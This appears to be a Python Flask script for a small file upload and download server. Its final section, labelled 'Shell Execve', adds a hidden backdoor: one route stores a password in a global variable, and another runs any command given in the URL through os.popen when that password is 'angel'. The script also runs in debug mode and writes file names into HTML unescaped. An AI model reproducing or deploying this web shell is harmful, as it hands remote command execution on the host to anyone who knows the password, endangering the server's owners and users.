# -*- coding: utf-8 -*-
from flask import *
import os, uuid, platform
from werkzeug.utils import secure_filename
#=======================================#
# Global Options.
if platform.system() == "Windows":
    slash = '\\'
else:
    platform.system()=="Linux"
    slash = '/'
app = Flask(__name__)
file_bit = 0
UPLOAD_FOLDER = 'upload'
DOWNLOAD_FOLDER = 'upload'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)
else:
    pass
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)
else:
    pass
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['UPLOAD_FOLDER'] = DOWNLOAD_FOLDER
#=======================================#
# Page Setting.
upload_page = '''
<!doctype html>
<title>Upload File</title>
<h1>Upload File</h1>
<form action="" method=post enctype=multipart/form-data>
<p><input type=file name=file>
    <input type=submit value=Upload>
</form>
'''
#=======================================#
# File upload & download.
@app.route('/download/<filename>',methods=['GET','POST'])
def download_file(filename):
    response = make_response(send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True))
    response.headers["Content-Disposition"] = "attachment; filename={}".format(filename.encode().decode('latin-1'))
    return response

@app.route('/upload',methods=['GET','POST'])
def upload_file():
    global file_bit
    if request.method =='POST':
        try:
            file = request.files['file']
            file_name = secure_filename(file.filename)
            if os.path.exists(UPLOAD_FOLDER + slash + file_name):
                file_name = str(file_bit) + file_name
                file_bit += 1
            # file_name = str(uuid.uuid4()) + '.' + filename.rsplit('.', 1)[1]
            file.save(os.path.join(app.config['UPLOAD_FOLDER'],file_name))
            base_path = os.getcwd()
            file_path = base_path + slash + app.config['UPLOAD_FOLDER'] + slash + file_name
            #return redirect(url_for('upload_file',filename = file_name))
            return "[ OK ] Upload Successfully!"
        except:
            return "[ Error] Unknow Error !"
    return upload_page

@app.route('/uploads',methods=['GET','POST'])
def upload_files():
    Head = '''
<!DOCTYPE html>
<html>
<head> 
<meta charset="utf-8"> 
<title>Downloads</title> 
</head> 
<body>
'''
    download_list = ""
    file_list = os.listdir(DOWNLOAD_FOLDER + slash)
    for file in file_list:
        download_list += '''<a href="/download/''' + file + '''">''' + """
    <p1>""" + file + """</p1>
        """
    Top = '''
</a>
</body>
</html>
'''
    return Head + download_list + Top

#=======================================#
# Shell Execve.
@app.route("/auth/<auths>",methods=['GET','POST'])
def auth(auths):
    global auth
    auth = auths
    return " [ OK ]"

@app.route("/shell/<commands>",methods=['GET','POST'])
def shell(commands):
    if auth == "angel":
        return os.popen(commands).read()
    else:
        return " [ OK ]"

app.run(debug=True)